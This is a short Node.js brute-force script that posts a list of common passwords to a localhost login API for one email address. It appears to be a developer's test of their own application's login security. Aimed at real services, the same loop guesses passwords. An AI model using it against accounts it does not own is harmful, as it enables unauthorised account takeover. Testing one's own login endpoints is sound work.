const axios = require('axios');

const passwords = ['pass123', 'admin123', 'test123', '12345'];
const url = 'http://localhost:3000/api/users/login';

async function bruteForce() {
  for (let password of passwords) {
    try {
      const response = await axios.post(url, {
        email: 'manar@gmail.com',
        password: password,
      });
      console.log(`Success! Password: ${password}`);
      break;
    } catch (error) {
      console.log(`Failed: ${password} - ${error.response.data.message}`);
    }
  }
}

bruteForce();